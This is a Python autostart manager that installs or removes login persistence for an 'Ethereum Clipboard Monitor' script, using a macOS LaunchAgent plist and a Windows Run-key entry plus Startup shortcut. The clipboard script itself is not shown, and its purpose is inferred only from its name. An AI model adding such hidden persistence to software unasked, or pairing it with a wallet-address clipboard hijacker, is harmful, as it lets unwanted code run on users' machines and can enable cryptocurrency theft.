#!/usr/bin/env python3
import os
import sys
import platform
import subprocess
from pathlib import Path

class AutoStartManager:
    def __init__(self):
        self.app_name = "EthereumClipboardMonitor"
        self.script_path = str(Path(__file__).parent / "clipboard_monitor.py")
        self.python_path = sys.executable
        
    def install_autostart(self):
        system = platform.system()
        
        try:
            if system == "Darwin":  # macOS
                self._install_macos()
            elif system == "Windows":
                self._install_windows()
            else:
                print(f"Platform {system} not supported")
                return False
                
            print("Autostart successfully installed!")
            return True
            
        except Exception as e:
            print(f"Error: {e}")
            return False
    
    def remove_autostart(self):
        system = platform.system()
        
        try:
            if system == "Darwin":  # macOS
                self._remove_macos()
            elif system == "Windows":
                self._remove_windows()
            else:
                print(f"Platform {system} not supported")
                return False
                
            print("Autostart successfully removed!")
            return True
            
        except Exception as e:
            print(f"Error: {e}")
            return False
    
    def _install_macos(self):
        launch_agents_dir = Path.home() / "Library" / "LaunchAgents"
        launch_agents_dir.mkdir(exist_ok=True)
        
        plist_file = launch_agents_dir / f"com.{self.app_name.lower()}.plist"
        
        plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.{self.app_name.lower()}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{self.python_path}</string>
        <string>{self.script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <false/>
    <key>StandardErrorPath</key>
    <string>{Path.home()}/Library/Logs/{self.app_name}.log</string>
    <key>StandardOutPath</key>
    <string>{Path.home()}/Library/Logs/{self.app_name}.log</string>
</dict>
</plist>"""
        
        with open(plist_file, 'w') as f:
            f.write(plist_content)
        
        subprocess.run(['launchctl', 'load', '-w', str(plist_file)], check=True)
    
    def _remove_macos(self):
        plist_file = Path.home() / "Library" / "LaunchAgents" / f"com.{self.app_name.lower()}.plist"
        
        if plist_file.exists():
            try:
                subprocess.run(['launchctl', 'unload', '-w', str(plist_file)], check=False)
            except:
                pass
            
            plist_file.unlink()
    
    def _install_windows(self):
        import winreg
        
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        
        command = f'"{self.python_path}" "{self.script_path}"'
        winreg.SetValueEx(key, self.app_name, 0, winreg.REG_SZ, command)
        winreg.CloseKey(key)
        
        self._create_startup_shortcut_windows()
    
    def _remove_windows(self):
        import winreg
        
        try:
            # Удаляем из реестра
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.DeleteValue(key, self.app_name)
            winreg.CloseKey(key)
        except FileNotFoundError:
            pass 
        
        startup_folder = Path.home() / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
        shortcut_path = startup_folder / f"{self.app_name}.lnk"
        
        if shortcut_path.exists():
            shortcut_path.unlink()
    
    def _create_startup_shortcut_windows(self):
        """Создает ярлык в папке автозагрузки Windows"""
        try:
            import win32com.client
            
            startup_folder = Path.home() / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
            shortcut_path = startup_folder / f"{self.app_name}.lnk"
            
            shell = win32com.client.Dispatch("WScript.Shell")
            shortcut = shell.CreateShortCut(str(shortcut_path))
            shortcut.Targetpath = self.python_path
            shortcut.Arguments = f'"{self.script_path}"'
            shortcut.WorkingDirectory = str(Path(self.script_path).parent)
            shortcut.Description = "Ethereum Clipboard Monitor"
            shortcut.save()
            
        except ImportError:
            print("win32com.client not found. Please install pywin32 to create startup shortcuts.")
            print("pip install pywin32")

def main():
    if len(sys.argv) < 2:
        print("Usage:")
        print("  python autostart.py install   - Install autostart")
        print("  python autostart.py remove    - Remove autostart")
        return
    
    manager = AutoStartManager()
    
    if sys.argv[1] == "install":
        manager.install_autostart()
    elif sys.argv[1] == "remove":
        manager.remove_autostart()
    else:
        print("Invalid argument. Use 'install' or 'remove'.")

if __name__ == "__main__":
    main()